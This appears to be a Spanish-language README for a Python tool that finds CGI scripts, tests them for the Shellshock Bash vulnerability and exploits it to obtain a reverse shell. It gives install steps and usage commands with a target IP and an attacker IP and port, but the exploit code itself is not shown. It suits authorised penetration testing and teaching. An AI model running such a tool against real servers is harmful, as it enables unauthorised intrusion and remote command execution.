# Shellshock Scanner y Explotador

Este script de Python es una herramienta para detectar y explotar la vulnerabilidad Shellshock (CVE-2014-6271) en servidores web que utilizan scripts CGI.

## Descripción

Shellshock es una vulnerabilidad crítica que afecta a la shell Bash y permite a un atacante ejecutar comandos arbitrarios a través de variables de entorno. Esta herramienta automatiza:

- La detección de scripts CGI accesibles en el servidor objetivo
- La verificación de vulnerabilidad Shellshock en cada script encontrado
- La explotación para obtener una shell reversa

## Requisitos

La herramienta requiere las siguientes dependencias:
- Python 3
- gobuster
- curl
- netcat (nc)

## Instalación

```bash
# Clonar el repositorio
git clone https://github.com/usuario/shellshock-scanner.git
cd shellshock-scanner

# Hacer el script ejecutable
chmod +x shellshock_scanner.py

# Verificar dependencias (el script comprobará automáticamente)
sudo apt install gobuster curl netcat-traditional
```

## Uso

### Modo interactivo (recomendado)

Simplemente ejecuta el script sin argumentos y seguirás los pasos interactivos:

```bash
./shellshock_scanner.py
```

El script te solicitará:
- IP del servidor objetivo
- Tu IP para la shell reversa
- Puerto para la shell reversa (por defecto: 7777)
- Ruta a un diccionario para la fase de enumeración (opcional)

### Modo con argumentos

También puedes ejecutar el script con argumentos específicos:

```bash
./shellshock_scanner.py --target 192.168.1.10 --attacker-ip 192.168.1.5 --attacker-port 4444 --wordlist /usr/share/wordlists/dirb/common.txt
```

Para probar un script CGI específico:

```bash
./shellshock_scanner.py --target 192.168.1.10 --attacker-ip 192.168.1.5 --cgi-script test.cgi
```

## Proceso de funcionamiento

1. **Verificación de dependencias**: El script comprueba que todas las herramientas necesarias estén instaladas.
2. **Enumeración**: Utiliza gobuster para encontrar scripts CGI en el directorio `/cgi-bin/` del servidor.
3. **Detección**: Verifica la vulnerabilidad Shellshock en cada script encontrado.
4. **Explotación**: Para los scripts vulnerables, intenta obtener una shell reversa.

## Características adicionales

- Creación automática de un wordlist básico si no se encuentra ninguno.
- Métodos alternativos de detección si gobuster falla.
- Múltiples payloads para aumentar las probabilidades de éxito.
- Comprobación manual de scripts CGI específicos.

## Consideraciones legales

Esta herramienta está diseñada únicamente para fines educativos y de pruebas de penetración autorizadas. El uso de esta herramienta contra sistemas sin permiso explícito es ilegal y puede resultar en consecuencias legales.

## Contribuciones

Las contribuciones son bienvenidas. Por favor, envía pull requests para mejoras o correcciones.

## Licencia

Este proyecto está licenciado bajo la licencia MIT - ver el archivo LICENSE para más detalles.
